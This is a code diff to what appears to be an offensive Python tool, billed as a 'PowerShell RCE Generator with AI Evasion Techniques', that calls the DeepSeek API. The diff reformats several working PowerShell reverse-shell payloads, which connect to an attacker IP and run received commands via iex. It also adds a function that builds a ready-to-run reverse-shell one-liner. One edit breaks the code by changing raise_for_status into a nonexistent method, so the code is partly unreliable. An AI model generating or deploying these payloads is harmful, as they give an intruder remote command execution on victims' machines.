@@ -40,7 +40,7 @@ class DeepSeekIntegration:
         try:
             print(f"{Fore.YELLOW}Making API request to DeepSeek...{Style.RESET_ALL}")
             response = requests.post(self.api_url, headers=self.headers, json=data, timeout=30)
-            response.raise_for_status()
+            response.raise_forStatus()
             result = response.json()
             print(f"{Fore.GREEN}API request successful!{Style.RESET_ALL}")
             return result['choices'][0]['message']['content']
@@ -93,17 +93,17 @@ def generate_reverse_shell(ip: str, port: str, shell_type: str = "powershell") -
     """
     if shell_type == "powershell":
         payload = f'''
-$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{{0}};
+$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})
+$stream = $client.GetStream()
+[byte[]]$bytes = 0..65535|%{{0}}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+    $stream.Write($sendbyte,0,$sendbyte.Length)
     $stream.Flush()
-}};
+}}
 $client.Close()
 '''
     elif shell_type == "nishang":
@@ -116,7 +116,7 @@ function ReverseShell {{
     try {{
         $client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
     }} catch {{
-        sleep 60
+        Start-Sleep -Seconds 60
         ReverseShell -IP $IP -Port $Port
         return
     }}
@@ -124,7 +124,7 @@ function ReverseShell {{
     [byte[]]$bytes = 0..65535|%{{0}}
     while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
         $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-        $sendback = (iex $data 2>&1 | Out-String )
+        $sendback = (iex $data 2>&1 | Out-String)
         $sendback2 = $sendback + "PS " + (pwd).Path + "> "
         $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
         $stream.Write($sendbyte,0,$sendbyte.Length)
@@ -142,7 +142,7 @@ $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{{0}}
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-    $sendback = (iex $data 2>&1 | Out-String )
+    $sendback = (iex $data 2>&1 | Out-String)
     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
     $stream.Write($sendbyte,0,$sendbyte.Length)
@@ -208,14 +208,14 @@ def display_banner():
     Display a cool banner for the tool
     """
     banner = f"""
-    {Fore.CYAN}                                                                                                                   
-░░      ░░░  ░░░░  ░░       ░░░        ░░       ░░░░      ░░░  ░░░░  ░░        ░░  ░░░░░░░░  ░░░░░░░░░      ░░░        ░
-▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒  ▒▒▒▒  ▒▒▒▒▒  ▒▒▒▒
-▓▓      ▓▓▓  ▓▓▓▓  ▓▓       ▓▓▓      ▓▓▓▓       ▓▓▓▓      ▓▓▓        ▓▓      ▓▓▓▓  ▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓  ▓▓▓▓  ▓▓▓▓▓  ▓▓▓▓
-███████  ██  ████  ██  ████████  ████████  ███  █████████  ██  ████  ██  ████████  ████████  ████████        █████  ████
-██      ████      ███  ████████        ██  ████  ███      ███  ████  ██        ██        ██        ██  ████  ██        █
-                                                                                                                                                                      
-   {Fore.MAGENTA}***PowerShell RCE Generator with AI Evasion Techniques version 1.0 Created by HantuKod***{Style.RESET_ALL}
+    {Fore.CYAN}
+                    ┏┓        ┏┓┓   ┓┓  ┏┓┳
+                    ┗┓┓┏┏┓┏┓┏┓┗┓┣┓┏┓┃┃  ┣┫┃
+                    ┗┛┗┻┣┛┗ ┛ ┗┛┛┗┗ ┗┗  ┛┗┻
+                        ┛        
+        PowerShell RCE Generator with AI Evasion Techniques
+                Created by HantuKod | Version 1.3                                                                                                                                                                                                        
+   {Style.RESET_ALL}
    """
     print(banner)
 
@@ -323,6 +323,29 @@ def print_step(step_number, description):
     """
     print(f"\n{Fore.YELLOW}Step {step_number}: {description}{Style.RESET_ALL}")
 
+def create_simple_oneliner(ip: str, port: int) -> str:
+    """
+    Create a simple one-liner without function definitions
+    """
+    oneliner = f"""
+    $client=New-Object System.Net.Sockets.TCPClient('{ip}',{port});
+    $stream=$client.GetStream();
+    [byte[]]$bytes=0..65535|%{{0}};
+    while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){{
+        $data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
+        $sendback=(iex $data 2>&1|Out-String);
+        $sendback2=$sendback+'PS '+(pwd).Path+'> ';
+        $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
+        $stream.Write($sendbyte,0,$sendbyte.Length);
+        $stream.Flush()
+    }};
+    $client.Close()
+    """
+    
+    # Remove newlines and extra spaces
+    oneliner = ' '.join(oneliner.split())
+    return f'powershell -Command "{oneliner}"'
+
 def main():
     # Display banner
     clear_screen()
@@ -367,8 +390,8 @@ def main():
     
     # Generate a one-liner version if it's not polymorphic
     if user_input['mode'] != 'polymorphic':
-        encoded_cmd = base64.b64encode(basic_payload.encode('utf-16le')).decode()
-        oneliner = f"powershell -ep bypass -e {encoded_cmd}"
+        # Create a simple one-liner without functions
+        oneliner = create_simple_oneliner(user_input['ip'], user_input['port'])
         
         print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
         print(f"{Fore.BLUE}One-liner Command:{Style.RESET_ALL}")
